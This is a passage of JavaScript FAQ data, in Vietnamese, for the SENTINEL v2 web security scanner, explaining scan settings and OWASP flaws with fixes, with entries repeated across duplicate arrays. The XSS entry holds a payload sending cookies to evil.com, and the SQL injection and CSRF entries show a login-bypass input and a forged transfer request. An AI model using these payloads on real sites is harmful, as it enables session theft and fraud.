  { "id": "faq_crawl_depth", "keywords": ["crawl depth", "độ sâu", "crawl", "depth", "depth là gì"], "question": "Crawl Depth là gì?", "answer": "## Crawl Depth — Độ sâu duyệt link\n\n**Crawl Depth** xác định SENTINEL sẽ duyệt bao nhiêu lớp link từ URL gốc.\n\n**Các mức:**\n- `0` — chỉ kiểm thử URL gốc, không theo link nào\n- `1` — URL gốc và tất cả link xuất hiện trực tiếp trên trang (khuyến nghị)\n- `2` — duyệt thêm một lớp nữa từ các trang ở depth 1, phù hợp site lớn\n\n**Khuyến nghị thực tế:**\nDepth 1 với Request Budget 60 là cấu hình phù hợp nhất cho đa số website — thời gian chạy khoảng 30–60 giây và bao phủ các trang chính.\n\nNếu website có nhiều form và endpoint quan trọng ở trong (auth-protected pages), bạn cần thêm cookie authentication và tăng depth lên 2." },
  { "id": "faq_request_budget", "keywords": ["request budget", "budget", "số request", "bao nhiêu request", "giới hạn request"], "question": "Request Budget là gì?", "answer": "## Request Budget — Giới hạn số request\n\n**Request Budget** là tổng số HTTP request tối đa mà SENTINEL được phép gửi trong một lần scan.\n\n**Tại sao cần giới hạn?**\nMỗi endpoint được scan bằng nhiều payload khác nhau (SQL injection, XSS...), số request tăng nhanh theo số lượng form và parameter.\n\n**Các mức:**\n- `30` — nhanh (5–15 giây), bao phủ cơ bản, phù hợp kiểm tra nhanh\n- `60` — cân bằng (30–60 giây), khuyến nghị cho đa số trường hợp\n- `120` — kiểm tra kỹ hơn, phù hợp site quan trọng\n- `200` — toàn diện, tốn nhiều thời gian, dùng khi cần kiểm tra sâu\n\n**Lưu ý**: Budget cao hơn sẽ tìm được nhiều lỗi injection hơn vì có thể thử nhiều payload hơn trên mỗi endpoint." },
  { "id": "faq_auth", "keywords": ["xác thực", "authentication", "cookie", "bearer token", "jwt", "đăng nhập", "login", "auth"], "question": "Cách thêm Authentication khi scan?", "answer": "## Cấu hình Authentication trong URL Scan\n\nNếu target yêu cầu đăng nhập, bạn cần cung cấp credentials để SENTINEL có thể kiểm thử các trang auth-protected.\n\n**Mở rộng section Authentication trong URL Scan form, sau đó chọn một trong các phương thức:**\n\n**Cookie**\nLấy từ DevTools (F12) → Application → Cookies. Dán theo định dạng:\n```\nsession=abc123; csrf_token=xyz789\n```\n\n**Bearer Token (JWT)**\nDán phần token sau `Bearer `, không cần prefix:\n```\neyJhbGciOiJIUzI1NiJ9...\n```\n\n**Authorization Header**\nGiá trị đầy đủ của header, bao gồm cả prefix:\n```\nBasic dXNlcjpwYXNz\n```\n\n**Custom Headers**\nJSON object với các header tùy chỉnh:\n```json\n{\"X-API-Key\": \"abc123\", \"X-Tenant-ID\": \"tenant1\"}\n```\n\n**Mẹo thực tế**: Đăng nhập vào website bằng browser, mở DevTools và copy toàn bộ cookie string. Đây là cách đơn giản và hiệu quả nhất." },
  { "id": "faq_owasp", "keywords": ["owasp", "top 10", "owasp top 10", "danh mục", "category", "a01", "a02", "a03", "a04", "a05", "a06", "a07", "a08", "a09", "a10"], "question": "OWASP Top 10 là gì?", "answer": "## OWASP Top 10 — 2025\n\n**OWASP Top 10** là danh sách 10 rủi ro bảo mật web phổ biến và nguy hiểm nhất, được tổ chức OWASP (Open Worldwide Application Security Project) công bố và cập nhật định kỳ. Đây là chuẩn tham chiếu được công nhận rộng rãi trong ngành.\n\n| Mã | Tên | Mô tả ngắn |\n|----|-----|------------|\n| A01 | Broken Access Control | Lỗi kiểm soát quyền truy cập |\n| A02 | Cryptographic Failures | Mã hóa không đúng, thiếu security headers |\n| A03 | Injection | SQL, XSS, Command, SSTI |\n| A04 | Insecure Design | Thiết kế kiến trúc không an toàn |\n| A05 | Security Misconfiguration | Cấu hình sai server/app |\n| A06 | Vulnerable Components | Thư viện có CVE đã biết |\n| A07 | Auth & Session Failures | Xác thực và quản lý session yếu |\n| A08 | Software Integrity | Thiếu SRI, update không an toàn |\n| A09 | Logging Failures | Thiếu audit logging và monitoring |\n| A10 | SSRF | Server gửi request đến URL tùy ý |\n\nSENTINEL kiểm tra cả 10 danh mục này. Hỏi tôi về từng danh mục cụ thể (ví dụ: \"A01 là gì?\") để nhận giải thích chi tiết." },
  { "id": "faq_severity", "keywords": ["severity", "mức độ", "critical", "high", "medium", "low", "nghiêm trọng", "mức nghiêm trọng"], "question": "Các mức severity trong findings nghĩa là gì?", "answer": "## Mức độ nghiêm trọng (Severity)\n\nMỗi finding được phân loại theo 4 mức dựa trên khả năng khai thác và mức độ thiệt hại tiềm tàng:\n\n**Critical**\nLỗi cực kỳ nguy hiểm, có thể bị khai thác ngay. Cần vá trước tất cả các thứ khác.\nVí dụ: SQL Injection có thể đọc/xóa database, Authentication bypass hoàn toàn.\n\n**High**\nLỗi nghiêm trọng, có thể gây thiệt hại lớn cho dữ liệu hoặc người dùng.\nVí dụ: Stored XSS, IDOR lộ dữ liệu nhạy cảm.\n\n**Medium**\nLỗi có thể bị khai thác trong điều kiện nhất định. Cần khắc phục nhưng ít khẩn cấp hơn.\nVí dụ: Thiếu CSRF token, CORS misconfiguration.\n\n**Low**\nBest practice violation, lỗi nhỏ ít có khả năng bị khai thác độc lập.\nVí dụ: Thiếu một số security headers, cookie chưa có SameSite flag.\n\n**Chiến lược ưu tiên**: Fix Critical và High trước. Medium có thể xử lý trong sprint tiếp theo. Low là cải thiện dần dần." },
  { "id": "faq_risk_score", "keywords": ["risk score", "điểm rủi ro", "score", "gauge", "điểm số", "bao nhiêu điểm"], "question": "Risk Score được tính như thế nào?", "answer": "## Risk Score — Cách tính điểm rủi ro\n\n**Risk Score** (thang 0–100) là điểm tổng hợp phản ánh mức độ rủi ro tổng thể của hệ thống dựa trên tất cả findings.\n\n**Cách tính:**\n- Critical finding: +10 điểm\n- High finding: +7 điểm\n- Medium finding: +4 điểm\n- Low finding: +1 điểm\n\nĐiểm được giới hạn tối đa ở 100.\n\n**Phân loại:**\n\n| Điểm | Đánh giá | Hành động |\n|------|----------|----------|\n| 70–100 | Critical Risk | Vá ngay, không triển khai production |\n| 40–69 | High Risk | Lên kế hoạch vá trong sprint tới |\n| 15–39 | Medium Risk | Cải thiện trong roadmap |\n| 0–14 | Low Risk | Theo dõi và cải thiện định kỳ |\n\n**Lưu ý**: Risk Score là chỉ số tổng hợp, không thay thế việc đọc từng finding cụ thể. Một Critical finding đơn lẻ có thể nghiêm trọng hơn tổng hợp 10 Low findings." },
  { "id": "faq_sql_injection", "keywords": ["sql injection", "sql", "injection", "sqli", "sql là gì", "sql injection là gì", "lỗi sql"], "question": "SQL Injection là gì và cách fix?", "answer": "## SQL Injection (SQLi)\n\nSQL Injection xảy ra khi ứng dụng nhúng dữ liệu người dùng trực tiếp vào câu lệnh SQL mà không qua xử lý an toàn, cho phép kẻ tấn công thay đổi logic truy vấn.\n\n**Cơ chế tấn công:**\n\nCode dễ bị tấn công:\n```sql\nSELECT * FROM users WHERE email = '$email'\n```\n\nKẻ tấn công nhập: `admin@site.com' OR '1'='1`\n\nKết quả query trở thành:\n```sql\nSELECT * FROM users WHERE email = 'admin@site.com' OR '1'='1'\n```\n→ Trả về toàn bộ user, bypass authentication.\n\n**Hậu quả:** đọc dữ liệu nhạy cảm, xóa database, bypass login, trong một số trường hợp có thể thực thi lệnh hệ thống.\n\n**Cách khắc phục:**\n\n1. **Parameterized Queries / Prepared Statements** (quan trọng nhất)\n```python\ncursor.execute(\"SELECT * FROM users WHERE email = %s\", (email,))\n```\n\n2. **Dùng ORM**: Hibernate (Java), Sequelize (Node.js), Eloquent (PHP)\n\n3. **Validate input**: kiểm tra kiểu dữ liệu, từ chối ký tự không hợp lệ\n\n4. **Principle of least privilege**: database account của app chỉ cấp quyền cần thiết, không dùng root\n\n**OWASP**: A03 — Injection" },
  { "id": "faq_xss", "keywords": ["xss", "cross site scripting", "cross-site scripting", "script injection", "lỗi xss", "xss là gì"], "question": "XSS là gì và cách fix?", "answer": "## Cross-Site Scripting (XSS)\n\nXSS cho phép kẻ tấn công inject JavaScript độc hại vào trang web, script này chạy trong browser của người dùng khác dưới context của domain bị tấn công.\n\n**Ba loại XSS:**\n\n**Reflected XSS**: Payload qua URL parameter, chỉ ảnh hưởng người nhấn link\n```\nhttps://site.com/search?q=<script>document.location='https://evil.com/steal?c='+document.cookie</script>\n```\n\n**Stored XSS**: Payload lưu vào database, ảnh hưởng mọi người xem trang — nguy hiểm hơn nhiều\n\n**DOM XSS**: Payload thao túng DOM client-side qua JavaScript, không qua server\n\n**Hậu quả**: đánh cắp cookie/session, keylogging, defacement, phishing, thực thi hành động thay người dùng.\n\n**Cách khắc phục:**\n\n1. **Encode output trước khi render HTML**\n```javascript\nconst safe = element.textContent = userInput; // dùng textContent thay innerHTML\n```\n\n2. **DOMPurify cho client-side** khi cần render HTML từ user\n```javascript\nimport DOMPurify from 'dompurify';\nelement.innerHTML = DOMPurify.sanitize(userInput);\n```\n\n3. **Content Security Policy (CSP)**: header ngăn script từ nguồn không tin cậy\n\n4. **HttpOnly cookie**: ngăn XSS đọc session cookie qua JavaScript\n\n**OWASP**: A03 — Injection" },
  { "id": "faq_csrf", "keywords": ["csrf", "cross site request forgery", "csrf token", "lỗi csrf", "csrf là gì"], "question": "CSRF là gì và cách fix?", "answer": "## CSRF — Cross-Site Request Forgery\n\nCSRF lừa browser của nạn nhân gửi request đến ứng dụng mà họ đang đăng nhập, từ một trang web khác của kẻ tấn công, mà nạn nhân không hay biết.\n\n**Ví dụ tấn công:**\nNạn nhân đang đăng nhập vào bank.com. Họ ghé thăm evil.com — trang này chứa:\n```html\n<img src=\"https://bank.com/transfer?to=attacker&amount=1000000\">\n```\nBrowser tự động gửi request kèm cookie của bank.com → tiền bị chuyển.\n\n**Điều kiện để tấn công thành công:**\n- Nạn nhân đang có session hợp lệ\n- Server không xác minh nguồn gốc của request\n\n**Cách khắc phục:**\n\n1. **CSRF Token**: mỗi form chứa token ngẫu nhiên, server xác minh token khớp với session\n```html\n<input type=\"hidden\" name=\"csrf_token\" value=\"{random_token}\">\n```\n\n2. **SameSite cookie attribute**:\n```\nSet-Cookie: session=abc; SameSite=Strict; Secure; HttpOnly\n```\n`SameSite=Strict` ngăn browser gửi cookie cho cross-site request.\n\n3. **Kiểm tra Origin/Referer header**: server từ chối request từ origin không hợp lệ\n\n4. **Yêu cầu xác nhận lại mật khẩu** cho các thao tác quan trọng\n\n**OWASP**: A01 — Broken Access Control" },
  { "id": "faq_idor", "keywords": ["idor", "insecure direct object reference", "object reference", "broken access control", "truy cập trái phép"], "question": "IDOR (Broken Access Control) là gì?", "answer": "## IDOR — Insecure Direct Object Reference\n\nIDOR là lỗ hổng trong đó người dùng có thể truy cập trực tiếp vào tài nguyên của người khác bằng cách thay đổi identifier (ID, số, tên file...) trong request, vì server không kiểm tra quyền sở hữu.\n\n**Ví dụ thực tế:**\n```\nGET /api/orders/1234  → đơn hàng của tôi\nGET /api/orders/1235  → đơn hàng của người khác (server trả về!)\n```\n\n```\nGET /download?file=report_user123.pdf\nGET /download?file=report_user456.pdf  → đọc file người khác\n```\n\n**Tại sao phổ biến?**\nDễ bị bỏ qua vì developer quên kiểm tra authorization ở một số endpoint, đặc biệt là API endpoint mới thêm.\n\n**Cách khắc phục:**\n\n1. **Luôn verify ownership phía server**: trước khi trả dữ liệu, kiểm tra `resource.userId === session.userId`\n\n2. **Dùng UUID thay sequential ID**: `d4e5f6a7-...` khó đoán hơn `1235`\n\n3. **RBAC (Role-Based Access Control)**: mọi resource phải có owner và role được phép truy cập\n\n4. **Test bằng 2 account khác nhau**: đây là cách phát hiện IDOR nhanh nhất khi review\n\n**OWASP**: A01 — Broken Access Control" }
];
// Dữ liệu FAQ - Khai báo inline để luôn được bundle cùng ứng dụng
// Bộ tri thức bảo mật OWASP đầy đủ
const INLINE_FAQ_DATA_DUP_3 = [
  {
    "id": "faq_what_is_sentinel",
    "keywords": [
      "sentinel là gì",
      "tool là gì",
      "ứng dụng này",
      "phần mềm này",
      "công cụ này",
      "giới thiệu"
    ],
    "question": "SENTINEL là gì?",
    "answer": "## SENTINEL v2 là gì?\n\nSENTINEL v2 là công cụ kiểm thử bảo mật web theo chuẩn **OWASP Top 10 — 2025**, chạy trực tiếp trên máy dưới dạng Electron app. Mục tiêu là giúp developer và sinh viên học bảo mật theo chuẩn quốc tế một cách thực hành, không cần kết nối internet.\n\n**Hai chế độ scan chính:**\n- **URL Scan**: Kiểm thử black-box — gửi HTTP request thực tế đến target URL để phát hiện lỗ hổng runtime\n- **Project Scan**: Phân tích source code tĩnh — không chạy code, không kết nối mạng, tìm lỗ hổng trong code và dependencies\n\n**Điểm nổi bật:**\n- Hoạt động hoàn toàn offline\n- Phát hiện lỗ hổng theo chuẩn OWASP\n- Xuất báo cáo HTML/JSON\n- Lưu lịch sử scan tự động"
  },
  {
    "id": "faq_how_to_use",
    "keywords": [
      "cách dùng",
      "cách sử dụng",
      "hướng dẫn",
      "bắt đầu",
      "bước đầu",
      "sử dụng như thế nào",
      "làm thế nào"
    ],
    "question": "Cách sử dụng SENTINEL cơ bản?",
    "answer": "## Quy trình sử dụng SENTINEL\n\n**Bước 1 — Chọn chế độ scan**\nChọn tab **URL Scan** (kiểm thử website) hoặc **Project Scan** (kiểm thử source code) trên thanh điều hướng.\n\n**Bước 2 — Nhập mục tiêu**\n- URL Scan: nhập URL đầy đủ, ví dụ `https://example.com`\n- Project Scan: nhấn Browse để chọn thư mục gốc dự án\n\n**Bước 3 — Cấu hình**\n- **Crawl Depth**: độ sâu duyệt link (0, 1 hoặc 2)\n- **Request Budget**: số request tối đa (60 là cân bằng tốt)\n- **Authentication**: thêm cookie hoặc token nếu cần\n\n**Bước 4 — Chạy scan**\nNhấn **Start Scan** và theo dõi tiến trình realtime.\n\n**Bước 5 — Xem kết quả**\nFindings hiển thị ở panel phải, sắp xếp theo mức độ nguy hiểm. Nhấn vào finding để xem chi tiết và hướng dẫn khắc phục."
  },
  {
    "id": "faq_url_scan",
    "keywords": [
      "url scan",
      "scan url",
      "quét url",
      "kiểm thử url",
      "black-box",
      "blackbox",
      "url là gì"
    ],
    "question": "URL Scan là gì và dùng thế nào?",
    "answer": "## URL Scan — Black-box Testing\n\n**URL Scan** gửi HTTP request thực tế đến URL mục tiêu để phát hiện lỗ hổng có thể khai thác từ bên ngoài (không cần source code).\n\n**Cách cấu hình:**\n\n**URL**: Nhập đầy đủ bao gồm giao thức, ví dụ:\n- `https://example.com`\n- `http://localhost:3000`\n\n**Crawl Depth**:\n- `0` — chỉ kiểm thử URL gốc\n- `1` — URL gốc và tất cả link trực tiếp (khuyến nghị)\n- `2` — duyệt sâu hơn, phù hợp site lớn cần kiểm tra kỹ\n\n**Request Budget**:\n- `30` — nhanh, bao phủ cơ bản\n- `60` — cân bằng, phù hợp đa số trường hợp\n- `200` — kiểm tra kỹ, tốn nhiều thời gian hơn\n\n**Lưu ý quan trọng**: Chỉ scan các hệ thống bạn được phép kiểm thử. Hành vi trái phép là vi phạm pháp luật."
  },
  {
    "id": "faq_project_scan",
    "keywords": [
      "project scan",
      "scan project",
      "quét code",
      "source code",
      "static",
      "phân tích code",
      "tĩnh"
    ],
    "question": "Project Scan hoạt động như thế nào?",
    "answer": "## Project Scan — Static Code Analysis\n\n**Project Scan** phân tích source code tĩnh mà không chạy code hoặc kết nối mạng. Phù hợp để kiểm tra dự án trong quá trình phát triển.\n\n**Các loại lỗ hổng được phát hiện:**\n- **Dependencies CVE**: kiểm tra `package.json`, `pom.xml`, `build.gradle` có dependency lỗi thời\n- **Hardcoded secrets**: API key, password, token trong code\n- **Config files nhạy cảm**: `.env` files, config chứa credentials\n- **Logging patterns thiếu an toàn**: log dữ liệu nhạy cảm\n- **Insecure code patterns**: SQL query không dùng parameterized, v.v.\n\n**Tech stack hỗ trợ:**\nNode.js/React, Spring Boot/Java, PHP/Laravel, và generic projects.\n\n**Cách dùng:**\n1. Nhấn **Browse** và chọn thư mục gốc dự án\n2. SENTINEL tự động phát hiện tech stack và quét\n3. Kết quả hiển thị theo từng file và loại lỗ hổng\n\n**Mẹo**: Kết hợp cả URL Scan và Project Scan để phát hiện đầy đủ lỗ hổng — một số lỗi chỉ xuất hiện khi chạy thực tế (runtime), một số chỉ thấy qua code."
  },
  {
    "id": "faq_crawl_depth",
    "keywords": [
      "crawl depth",
      "độ sâu",
      "crawl",
      "depth",
      "depth là gì"
    ],
    "question": "Crawl Depth là gì?",
    "answer": "## Crawl Depth — Độ sâu duyệt link\n\n**Crawl Depth** xác định SENTINEL sẽ duyệt bao nhiêu lớp link từ URL gốc.\n\n**Các mức:**\n- `0` — chỉ kiểm thử URL gốc, không theo link nào\n- `1` — URL gốc và tất cả link xuất hiện trực tiếp trên trang (khuyến nghị)\n- `2` — duyệt thêm một lớp nữa từ các trang ở depth 1, phù hợp site lớn\n\n**Khuyến nghị thực tế:**\nDepth 1 với Request Budget 60 là cấu hình phù hợp nhất cho đa số website — thời gian chạy khoảng 30–60 giây và bao phủ các trang chính.\n\nNếu website có nhiều form và endpoint quan trọng ở trong (auth-protected pages), bạn cần thêm cookie authentication và tăng depth lên 2."
  },
  {
    "id": "faq_request_budget",
    "keywords": [
      "request budget",
      "budget",
      "số request",
      "bao nhiêu request",
      "giới hạn request"
    ],
    "question": "Request Budget là gì?",
    "answer": "## Request Budget — Giới hạn số request\n\n**Request Budget** là tổng số HTTP request tối đa mà SENTINEL được phép gửi trong một lần scan.\n\n**Tại sao cần giới hạn?**\nMỗi endpoint được scan bằng nhiều payload khác nhau (SQL injection, XSS...), số request tăng nhanh theo số lượng form và parameter.\n\n**Các mức:**\n- `30` — nhanh (5–15 giây), bao phủ cơ bản, phù hợp kiểm tra nhanh\n- `60` — cân bằng (30–60 giây), khuyến nghị cho đa số trường hợp\n- `120` — kiểm tra kỹ hơn, phù hợp site quan trọng\n- `200` — toàn diện, tốn nhiều thời gian, dùng khi cần kiểm tra sâu\n\n**Lưu ý**: Budget cao hơn sẽ tìm được nhiều lỗi injection hơn vì có thể thử nhiều payload hơn trên mỗi endpoint."
  },
  {
    "id": "faq_auth",
    "keywords": [
      "xác thực",
      "authentication",
      "cookie",
      "bearer token",
      "jwt",
      "đăng nhập",
      "login",
      "auth"
    ],
    "question": "Cách thêm Authentication khi scan?",
    "answer": "## Cấu hình Authentication trong URL Scan\n\nNếu target yêu cầu đăng nhập, bạn cần cung cấp credentials để SENTINEL có thể kiểm thử các trang auth-protected.\n\n**Mở rộng section Authentication trong URL Scan form, sau đó chọn một trong các phương thức:**\n\n**Cookie**\nLấy từ DevTools (F12) → Application → Cookies. Dán theo định dạng:\n```\nsession=abc123; csrf_token=xyz789\n```\n\n**Bearer Token (JWT)**\nDán phần token sau `Bearer `, không cần prefix:\n```\neyJhbGciOiJIUzI1NiJ9...\n```\n\n**Authorization Header**\nGiá trị đầy đủ của header, bao gồm cả prefix:\n```\nBasic dXNlcjpwYXNz\n```\n\n**Custom Headers**\nJSON object với các header tùy chỉnh:\n```json\n{\"X-API-Key\": \"abc123\", \"X-Tenant-ID\": \"tenant1\"}\n```\n\n**Mẹo thực tế**: Đăng nhập vào website bằng browser, mở DevTools và copy toàn bộ cookie string. Đây là cách đơn giản và hiệu quả nhất."
  },
  {
    "id": "faq_owasp",
    "keywords": [
      "owasp",
      "top 10",
      "owasp top 10",
      "danh mục",
      "category",
      "a01",
      "a02",
      "a03",
      "a04",
      "a05",
      "a06",
      "a07",
      "a08",
      "a09",
      "a10"
    ],
    "question": "OWASP Top 10 là gì?",
    "answer": "## OWASP Top 10 — 2025\n\n**OWASP Top 10** là danh sách 10 rủi ro bảo mật web phổ biến và nguy hiểm nhất, được tổ chức OWASP (Open Worldwide Application Security Project) công bố và cập nhật định kỳ. Đây là chuẩn tham chiếu được công nhận rộng rãi trong ngành.\n\n| Mã | Tên | Mô tả ngắn |\n|----|-----|------------|\n| A01 | Broken Access Control | Lỗi kiểm soát quyền truy cập |\n| A02 | Cryptographic Failures | Mã hóa không đúng, thiếu security headers |\n| A03 | Injection | SQL, XSS, Command, SSTI |\n| A04 | Insecure Design | Thiết kế kiến trúc không an toàn |\n| A05 | Security Misconfiguration | Cấu hình sai server/app |\n| A06 | Vulnerable Components | Thư viện có CVE đã biết |\n| A07 | Auth & Session Failures | Xác thực và quản lý session yếu |\n| A08 | Software Integrity | Thiếu SRI, update không an toàn |\n| A09 | Logging Failures | Thiếu audit logging và monitoring |\n| A10 | SSRF | Server gửi request đến URL tùy ý |\n\nSENTINEL kiểm tra cả 10 danh mục này. Hỏi tôi về từng danh mục cụ thể (ví dụ: \"A01 là gì?\") để nhận giải thích chi tiết."
  },
  {
    "id": "faq_severity",
    "keywords": [
      "severity",
      "mức độ",
      "critical",
      "high",
      "medium",
      "low",
      "nghiêm trọng",
      "mức nghiêm trọng"
    ],
    "question": "Các mức severity trong findings nghĩa là gì?",
    "answer": "## Mức độ nghiêm trọng (Severity)\n\nMỗi finding được phân loại theo 4 mức dựa trên khả năng khai thác và mức độ thiệt hại tiềm tàng:\n\n**Critical**\nLỗi cực kỳ nguy hiểm, có thể bị khai thác ngay. Cần vá trước tất cả các thứ khác.\nVí dụ: SQL Injection có thể đọc/xóa database, Authentication bypass hoàn toàn.\n\n**High**\nLỗi nghiêm trọng, có thể gây thiệt hại lớn cho dữ liệu hoặc người dùng.\nVí dụ: Stored XSS, IDOR lộ dữ liệu nhạy cảm.\n\n**Medium**\nLỗi có thể bị khai thác trong điều kiện nhất định. Cần khắc phục nhưng ít khẩn cấp hơn.\nVí dụ: Thiếu CSRF token, CORS misconfiguration.\n\n**Low**\nBest practice violation, lỗi nhỏ ít có khả năng bị khai thác độc lập.\nVí dụ: Thiếu một số security headers, cookie chưa có SameSite flag.\n\n**Chiến lược ưu tiên**: Fix Critical và High trước. Medium có thể xử lý trong sprint tiếp theo. Low là cải thiện dần dần."
  },
  {
    "id": "faq_risk_score",
    "keywords": [
      "risk score",
      "điểm rủi ro",
      "score",
      "gauge",
      "điểm số",
      "bao nhiêu điểm"
    ],
    "question": "Risk Score được tính như thế nào?",
    "answer": "## Risk Score — Cách tính điểm rủi ro\n\n**Risk Score** (thang 0–100) là điểm tổng hợp phản ánh mức độ rủi ro tổng thể của hệ thống dựa trên tất cả findings.\n\n**Cách tính:**\n- Critical finding: +10 điểm\n- High finding: +7 điểm\n- Medium finding: +4 điểm\n- Low finding: +1 điểm\n\nĐiểm được giới hạn tối đa ở 100.\n\n**Phân loại:**\n\n| Điểm | Đánh giá | Hành động |\n|------|----------|----------|\n| 70–100 | Critical Risk | Vá ngay, không triển khai production |\n| 40–69 | High Risk | Lên kế hoạch vá trong sprint tới |\n| 15–39 | Medium Risk | Cải thiện trong roadmap |\n| 0–14 | Low Risk | Theo dõi và cải thiện định kỳ |\n\n**Lưu ý**: Risk Score là chỉ số tổng hợp, không thay thế việc đọc từng finding cụ thể. Một Critical finding đơn lẻ có thể nghiêm trọng hơn tổng hợp 10 Low findings."
  },
  {
    "id": "faq_sql_injection",
    "keywords": [
      "sql injection",
      "sql",
      "injection",
      "sqli",
      "sql là gì",
      "sql injection là gì",
      "lỗi sql"
    ],
    "question": "SQL Injection là gì và cách fix?",
    "answer": "## SQL Injection (SQLi)\n\nSQL Injection xảy ra khi ứng dụng nhúng dữ liệu người dùng trực tiếp vào câu lệnh SQL mà không qua xử lý an toàn, cho phép kẻ tấn công thay đổi logic truy vấn.\n\n**Cơ chế tấn công:**\n\nCode dễ bị tấn công:\n```sql\nSELECT * FROM users WHERE email = '$email'\n```\n\nKẻ tấn công nhập: `admin@site.com' OR '1'='1`\n\nKết quả query trở thành:\n```sql\nSELECT * FROM users WHERE email = 'admin@site.com' OR '1'='1'\n```\n→ Trả về toàn bộ user, bypass authentication.\n\n**Hậu quả:** đọc dữ liệu nhạy cảm, xóa database, bypass login, trong một số trường hợp có thể thực thi lệnh hệ thống.\n\n**Cách khắc phục:**\n\n1. **Parameterized Queries / Prepared Statements** (quan trọng nhất)\n```python\ncursor.execute(\"SELECT * FROM users WHERE email = %s\", (email,))\n```\n\n2. **Dùng ORM**: Hibernate (Java), Sequelize (Node.js), Eloquent (PHP)\n\n3. **Validate input**: kiểm tra kiểu dữ liệu, từ chối ký tự không hợp lệ\n\n4. **Principle of least privilege**: database account của app chỉ cấp quyền cần thiết, không dùng root\n\n**OWASP**: A03 — Injection"
  },
  {
    "id": "faq_xss",
    "keywords": [
      "xss",
      "cross site scripting",
      "cross-site scripting",
      "script injection",
      "lỗi xss",
      "xss là gì"
    ],
    "question": "XSS là gì và cách fix?",
    "answer": "## Cross-Site Scripting (XSS)\n\nXSS cho phép kẻ tấn công inject JavaScript độc hại vào trang web, script này chạy trong browser của người dùng khác dưới context của domain bị tấn công.\n\n**Ba loại XSS:**\n\n**Reflected XSS**: Payload qua URL parameter, chỉ ảnh hưởng người nhấn link\n```\nhttps://site.com/search?q=<script>document.location='https://evil.com/steal?c='+document.cookie</script>\n```\n\n**Stored XSS**: Payload lưu vào database, ảnh hưởng mọi người xem trang — nguy hiểm hơn nhiều\n\n**DOM XSS**: Payload thao túng DOM client-side qua JavaScript, không qua server\n\n**Hậu quả**: đánh cắp cookie/session, keylogging, defacement, phishing, thực thi hành động thay người dùng.\n\n**Cách khắc phục:**\n\n1. **Encode output trước khi render HTML**\n```javascript\nconst safe = element.textContent = userInput; // dùng textContent thay innerHTML\n```\n\n2. **DOMPurify cho client-side** khi cần render HTML từ user\n```javascript\nimport DOMPurify from 'dompurify';\nelement.innerHTML = DOMPurify.sanitize(userInput);\n```\n\n3. **Content Security Policy (CSP)**: header ngăn script từ nguồn không tin cậy\n\n4. **HttpOnly cookie**: ngăn XSS đọc session cookie qua JavaScript\n\n**OWASP**: A03 — Injection"
  },
  {
    "id": "faq_csrf",
    "keywords": [
      "csrf",
      "cross site request forgery",
      "csrf token",
      "lỗi csrf",
      "csrf là gì"
    ],
    "question": "CSRF là gì và cách fix?",
    "answer": "## CSRF — Cross-Site Request Forgery\n\nCSRF lừa browser của nạn nhân gửi request đến ứng dụng mà họ đang đăng nhập, từ một trang web khác của kẻ tấn công, mà nạn nhân không hay biết.\n\n**Ví dụ tấn công:**\nNạn nhân đang đăng nhập vào bank.com. Họ ghé thăm evil.com — trang này chứa:\n```html\n<img src=\"https://bank.com/transfer?to=attacker&amount=1000000\">\n```\nBrowser tự động gửi request kèm cookie của bank.com → tiền bị chuyển.\n\n**Điều kiện để tấn công thành công:**\n- Nạn nhân đang có session hợp lệ\n- Server không xác minh nguồn gốc của request\n\n**Cách khắc phục:**\n\n1. **CSRF Token**: mỗi form chứa token ngẫu nhiên, server xác minh token khớp với session\n```html\n<input type=\"hidden\" name=\"csrf_token\" value=\"{random_token}\">\n```\n\n2. **SameSite cookie attribute**:\n```\nSet-Cookie: session=abc; SameSite=Strict; Secure; HttpOnly\n```\n`SameSite=Strict` ngăn browser gửi cookie cho cross-site request.\n\n3. **Kiểm tra Origin/Referer header**: server từ chối request từ origin không hợp lệ\n\n4. **Yêu cầu xác nhận lại mật khẩu** cho các thao tác quan trọng\n\n**OWASP**: A01 — Broken Access Control"
  },
  {
    "id": "faq_idor",
    "keywords": [
      "idor",
      "insecure direct object reference",
      "object reference",
      "broken access control",
      "truy cập trái phép"
    ],
    "question": "IDOR (Broken Access Control) là gì?",
    "answer": "## IDOR — Insecure Direct Object Reference\n\nIDOR là lỗ hổng trong đó người dùng có thể truy cập trực tiếp vào tài nguyên của người khác bằng cách thay đổi identifier (ID, số, tên file...) trong request, vì server không kiểm tra quyền sở hữu.\n\n**Ví dụ thực tế:**\n```\nGET /api/orders/1234  → đơn hàng của tôi\nGET /api/orders/1235  → đơn hàng của người khác (server trả về!)\n```\n\n```\nGET /download?file=report_user123.pdf\nGET /download?file=report_user456.pdf  → đọc file người khác\n```\n\n**Tại sao phổ biến?**\nDễ bị bỏ qua vì developer quên kiểm tra authorization ở một số endpoint, đặc biệt là API endpoint mới thêm.\n\n**Cách khắc phục:**\n\n1. **Luôn verify ownership phía server**: trước khi trả dữ liệu, kiểm tra `resource.userId === session.userId`\n\n2. **Dùng UUID thay sequential ID**: `d4e5f6a7-...` khó đoán hơn `1235`\n\n3. **RBAC (Role-Based Access Control)**: mọi resource phải có owner và role được phép truy cập\n\n4. **Test bằng 2 account khác nhau**: đây là cách phát hiện IDOR nhanh nhất khi review\n\n**OWASP**: A01 — Broken Access Control"
  }
];
const INLINE_FAQ_DATA_DUP_4 = [
  {
    "id": "faq_what_is_sentinel",
    "keywords": ["sentinel là gì", "tool là gì", "ứng dụng này", "phần mềm này", "công cụ này", "giới thiệu"],
    "question": "SENTINEL là gì?",
    "answer": "## SENTINEL v2 là gì?\n\nSENTINEL v2 là công cụ kiểm thử bảo mật web theo chuẩn **OWASP Top 10 — 2025**, chạy trực tiếp trên máy dưới dạng Electron app. Mục tiêu là giúp developer và sinh viên học bảo mật theo chuẩn quốc tế một cách thực hành, không cần kết nối internet.\n\n**Hai chế độ scan chính:**\n- **URL Scan**: Kiểm thử black-box — gửi HTTP request thực tế đến target URL để phát hiện lỗ hổng runtime\n- **Project Scan**: Phân tích source code tĩnh — không chạy code, không kết nối mạng, tìm lỗ hổng trong code và dependencies\n\n**Điểm nổi bật:**\n- Hoạt động hoàn toàn offline\n- Phát hiện lỗ hổng theo chuẩn OWASP\n- Xuất báo cáo HTML/JSON\n- Lưu lịch sử scan tự động"
  },
  {
    "id": "faq_websocket_security",
    "keywords": ["websocket", "ws", "wss", "socket.io", "realtime security", "websocket security"],
    "question": "WebSocket có các lỗ hổng bảo mật nào?",
